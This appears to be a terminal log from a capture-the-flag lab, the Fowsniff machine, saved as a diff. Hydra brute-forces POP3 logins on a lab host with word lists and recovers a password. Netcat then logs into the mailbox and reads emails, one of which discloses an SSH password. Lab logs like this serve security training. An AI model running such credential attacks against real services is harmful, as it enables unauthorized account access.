@@ -1,0 +1,335 @@
+┌──(zetayota㉿Sophy)-[~]
+└─$ nano users.txt                                 
+                                                                    
+┌──(zetayota㉿Sophy)-[~]
+└─$ ls            
+addobbe.apk               kipoffcapture-01.cap
+capture-01.cap            kipoffcapture-01.csv
+capture-01.csv            kipoffcapture-01.kismet.csv
+capture-01.kismet.csv     kipoffcapture-01.kismet.netxml
+capture-01.kismet.netxml  kipoffcapture-01.log.csv
+capture-01.log.csv        kipoffnewcap.hccap
+capture-02.cap            Music
+capture-02.csv            pass.txt
+capture-02.kismet.csv     Pictures
+capture-02.kismet.netxml  Public
+capture-02.log.csv        Ratinthehood.apk
+Desktop                   Samsungmini.apk
+Documents                 sha256_hashing.txt
+dos.sh                    Templates
+Downloads                 TheFatRat
+hashes.txt                Videos
+hashing.txt               waydroid-installer
+hs
+                                                                    
+┌──(zetayota㉿Sophy)-[~]
+└─$ cat pass.txt         
+mailcall
+bilbo101
+apples01
+skyler22
+scoobydoo2
+carp4ever
+orlando12
+07011972
+
+                                                                    
+┌──(zetayota㉿Sophy)-[~]
+└─$ nano users.txt
+                                                                    
+┌──(zetayota㉿Sophy)-[~]
+└─$ cat users.txt
+mauer
+mustikka
+tegel
+baksteen
+seina
+stone
+mursten
+parede
+sciana
+
+                                                                    
+┌──(zetayota㉿Sophy)-[~]
+└─$ hydra -L users.txt -P pass.txt 10.10.245.191 -v
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-24 07:23:46
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+
+Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
+                                                                           
+┌──(zetayota㉿Sophy)-[~]
+└─$ hydra -L users.txt -P pass.txt 10.10.245.191   
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-24 07:24:16
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+
+Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
+                                                                                                                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ hydra -L users.txt -P pass.txt 10.10.245.191 pop3
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-24 07:25:06
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:10/p:9), ~6 tries per task
+[DATA] attacking pop3://10.10.245.191:110/
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+                                                                                                                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ hydra -L users.txt -P pass.txt 10.10.245.191 pop3 -v
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-24 07:25:32
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:10/p:9), ~6 tries per task
+[DATA] attacking pop3://10.10.245.191:110/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] CAPABILITY: +OK
+CAPA
+TOP
+UIDL
+RESP-CODES
+PIPELINING
+AUTH-RESP-CODE
+USER
+SASL PLAIN
+.
+[VERBOSE] using POP3 PLAIN AUTH mechanism
+[110][pop3] host: 10.10.245.191   login: seina   password: scoobydoo2
+[STATUS] attack finished for 10.10.245.191 (waiting for children to complete tests)
+[STATUS] 90.00 tries/min, 90 tries in 00:01h, 1 to do in 00:01h, 10 active
+^C[ERROR] Received signal 2, going down ...
+                                                                                                                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ hydra -L users.txt -P pass.txt 10.10.245.191 pop3 -V
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-24 07:27:26
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:10/p:9), ~6 tries per task
+[DATA] attacking pop3://10.10.245.191:110/
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "mailcall" - 1 of 90 [child 0] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "bilbo101" - 2 of 90 [child 1] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "apples01" - 3 of 90 [child 2] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "skyler22" - 4 of 90 [child 3] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "scoobydoo2" - 5 of 90 [child 4] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "carp4ever" - 6 of 90 [child 5] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "orlando12" - 7 of 90 [child 6] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "07011972" - 8 of 90 [child 7] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mauer" - pass "" - 9 of 90 [child 8] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "mailcall" - 10 of 90 [child 9] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "bilbo101" - 11 of 90 [child 10] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "apples01" - 12 of 90 [child 11] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "skyler22" - 13 of 90 [child 12] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "scoobydoo2" - 14 of 90 [child 13] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "carp4ever" - 15 of 90 [child 14] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "orlando12" - 16 of 90 [child 15] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "07011972" - 17 of 90 [child 3] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mustikka" - pass "" - 18 of 90 [child 11] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "mailcall" - 19 of 90 [child 0] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "bilbo101" - 20 of 90 [child 1] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "apples01" - 21 of 90 [child 2] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "skyler22" - 22 of 90 [child 4] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "scoobydoo2" - 23 of 90 [child 5] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "carp4ever" - 24 of 90 [child 6] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "orlando12" - 25 of 90 [child 7] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "07011972" - 26 of 90 [child 8] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "tegel" - pass "" - 27 of 90 [child 9] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "mailcall" - 28 of 90 [child 10] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "bilbo101" - 29 of 90 [child 12] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "apples01" - 30 of 90 [child 13] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "skyler22" - 31 of 90 [child 14] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "scoobydoo2" - 32 of 90 [child 15] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "carp4ever" - 33 of 90 [child 1] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "orlando12" - 34 of 90 [child 3] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "07011972" - 35 of 90 [child 0] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "baksteen" - pass "" - 36 of 90 [child 2] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "mailcall" - 37 of 90 [child 4] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "bilbo101" - 38 of 90 [child 5] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "apples01" - 39 of 90 [child 6] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "skyler22" - 40 of 90 [child 7] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "scoobydoo2" - 41 of 90 [child 8] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "carp4ever" - 42 of 90 [child 9] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "orlando12" - 43 of 90 [child 10] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "07011972" - 44 of 90 [child 11] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "seina" - pass "" - 45 of 90 [child 12] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "mailcall" - 46 of 90 [child 13] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "bilbo101" - 47 of 90 [child 14] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "apples01" - 48 of 90 [child 15] (0/0)
+[110][pop3] host: 10.10.245.191   login: seina   password: scoobydoo2
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "skyler22" - 49 of 90 [child 8] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "scoobydoo2" - 50 of 90 [child 1] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "carp4ever" - 51 of 90 [child 0] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "orlando12" - 52 of 90 [child 2] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "07011972" - 53 of 90 [child 3] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "stone" - pass "" - 54 of 90 [child 4] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "mailcall" - 55 of 90 [child 5] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "bilbo101" - 56 of 90 [child 6] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "apples01" - 57 of 90 [child 7] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "skyler22" - 58 of 90 [child 9] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "scoobydoo2" - 59 of 90 [child 10] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "carp4ever" - 60 of 90 [child 11] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "orlando12" - 61 of 90 [child 12] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "07011972" - 62 of 90 [child 13] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "mursten" - pass "" - 63 of 90 [child 14] (0/0)
+[ATTEMPT] target 10.10.245.191 - login "parede" - pass "mailcall" - 64 of 90 [child 15] (0/0)
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+                                                                                                                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ nc 10.10.245.191 110
++OK Welcome to the Fowsniff Corporate Mail Server!
+user seina pass scoobydoo2
++OK
+user seina
++OK
+-ERR Disconnected for inactivity.
+                                                                                    
+┌──(zetayota㉿Sophy)-[~]
+└─$ nc 10.10.245.191 110
++OK Welcome to the Fowsniff Corporate Mail Server!
+user seina
++OK
+pass scoobydoo2
++OK Logged in.
+list
++OK 2 messages:
+1 1622
+2 1280
+.
+retr 1
++OK 1622 octets
+Return-Path: <stone@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1000)
+        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
+    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
+    tegel@fowsniff
+Subject: URGENT! Security EVENT!
+Message-Id: <20180313185107.0FA3916A@fowsniff>
+Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+From: stone@fowsniff (stone)
+
+Dear All,
+
+A few days ago, a malicious actor was able to gain entry to
+our internal email systems. The attacker was able to exploit
+incorrectly filtered escape characters within our SQL database
+to access our login credentials. Both the SQL and authentication
+system used legacy methods that had not been updated in some time.
+
+We have been instructed to perform a complete internal system
+overhaul. While the main systems are "in the shop," we have
+moved to this isolated, temporary server that has minimal
+functionality.
+
+This server is capable of sending and receiving emails, but only
+locally. That means you can only send emails to other users, not
+to the world wide web. You can, however, access this system via 
+the SSH protocol.
+
+The temporary password for SSH is "S1ck3nBluff+secureshell"
+
+You MUST change this password as soon as possible, and you will do so under my
+guidance. I saw the leak the attacker posted online, and I must say that your
+passwords were not very secure.
+
+Come see me in my office at your earliest convenience and we'll set it up.
+
+Thanks,
+A.J Stone
+
+
+.
+RETR 2
++OK 1280 octets
+Return-Path: <baksteen@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1004)
+        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+To: seina@fowsniff
+Subject: You missed out!
+Message-Id: <20180313185405.101CA1AC2@fowsniff>
+Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+From: baksteen@fowsniff
+
+Devin,
+
+You should have seen the brass lay into AJ today!
+We are going to be talking about this one for a looooong time hahaha.
+Who knew the regional manager had been in the navy? She was swearing l
+
+I don't know what kind of pneumonia or something you brought back with
+you from your camping trip, but I think I'm coming down with it myself
+How long have you been gone - a week?
+Next time you're going to get sick and miss the managerial blowout of 
+at least keep it to yourself!
+
+I'm going to head home early and eat some chicken soup. 
+I think I just got an email from Stone, too, but it's probably just so
+"Let me explain the tone of my meeting with management" face-saving ma
+I'll read it when I get back.
+
+Feel better,
+
+Skyler
+
+PS: Make sure you change your email password. 
+AJ had been telling us to do that right before Captain Profanity showe
+
+.
+-ERR Disconnected for inactivity.
+                                                                      
+┌──(zetayota㉿Sophy)-[~]
+└─$ 
